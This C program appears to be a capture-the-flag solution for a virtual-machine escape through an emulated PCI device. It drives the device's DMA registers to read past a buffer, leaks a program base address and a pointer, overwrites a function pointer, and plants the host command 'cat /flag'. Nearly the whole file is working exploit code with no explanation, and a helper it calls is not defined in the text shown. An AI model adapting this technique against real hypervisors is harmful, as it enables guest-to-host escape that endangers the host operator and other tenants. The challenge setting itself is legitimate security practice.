#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <sys/io.h>

uint64_t PORT_BASE = 0xc040;

unsigned int DELAY = 200 * 1000;

int main() {
  if (iopl(3) !=0 ) {
    printf("iopl err\n");
  }
  int fd = open("/sys/devices/pci0000:00/0000:00:02.0/resource0", O_RDWR | O_SYNC);
  printf("Fd: %d\n", fd);
  void* mmio = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  printf("Mmio: %p\n", mmio);

  uint64_t* dma = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(dma, 0, sizeof(dma));

  uint64_t paddr;
  virt_to_phys_user(&paddr, getpid(), (uintptr_t)dma);
  printf("Virt: %p Phys: %p\n", dma, paddr);

  outl(paddr, PORT_BASE + 28);    // cpu_addr_out
  outl(0x1000, PORT_BASE + 24);   // cpu_addr_lim
  outl(0x1000, PORT_BASE + 36);   // cpu_addr_len
  outb(1, PORT_BASE + 20);        // cpu_addr_dir

  outl(0x1000 + 0x30, PORT_BASE + 12);    // buf2 -> buf1
  outl(0x1000 + 0x30, PORT_BASE + 12);    // buf2 -> buf1

  outb(1, PORT_BASE + 8);   // TRIGGER

  usleep(DELAY);

  for (int i = 0; i < 10; i++) {
    printf("%p\n", dma[i]);
  }

  uint64_t pie_base = dma[2] - 0x45fe46;
  uint64_t opaque = dma[3];

  dma[2] = pie_base + 0x2d2f80;
  dma[3] = opaque + 0x1d20 + 0x800;
  strcpy((char*)&dma[256], "cat /flag");

  outb(0, PORT_BASE + 20);        // cpu_addr_dir
  outb(1, PORT_BASE + 8);   // TRIGGER

  usleep(DELAY);

  outl(0x1000 + 0x30, PORT_BASE + 16);    // buf1 -> buf2
  outl(0x1000 + 0x30, PORT_BASE + 16);    // buf1 -> buf2

  outb(1, PORT_BASE + 8);   // TRIGGER

  puts("done");
  getchar();
}
